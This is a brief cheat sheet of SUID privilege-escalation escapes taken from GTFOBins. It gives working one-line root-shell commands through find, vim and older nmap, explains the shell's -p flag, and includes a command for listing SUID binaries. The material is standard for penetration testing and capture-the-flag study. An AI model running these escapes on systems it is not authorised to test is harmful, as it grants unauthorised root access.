# SUID GTFOBins Escapes

## find

```bash
find . -exec /bin/sh -p \;
```

The `-p` flag is critical — it preserves the effective UID (root) instead of dropping privileges. Without it, the shell would drop back to your original user.

## vim

```bash
vim -c ':!/bin/sh' -c ':q'
```

Or interactively once vim is open:

```
:!/bin/sh
```

## nmap (older versions only)

```bash
nmap --interactive
```

Then at the nmap prompt:

```
!sh
```

> **Note:** The `--interactive` flag was removed in nmap ≥ 5.20, so this only works on older installations.

---

## Why `-p` matters

When a SUID binary spawns a shell, most modern shells (bash, sh) drop the effective UID back to the real UID as a security measure. The `-p` (privileged) flag tells the shell to keep the effective UID. This applies to `find -exec`, `vim :!`, and similar command execution vectors.

## Quick enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Cross-reference results against [gtfobins.github.io](https://gtfobins.github.io) filtering by `+suid`.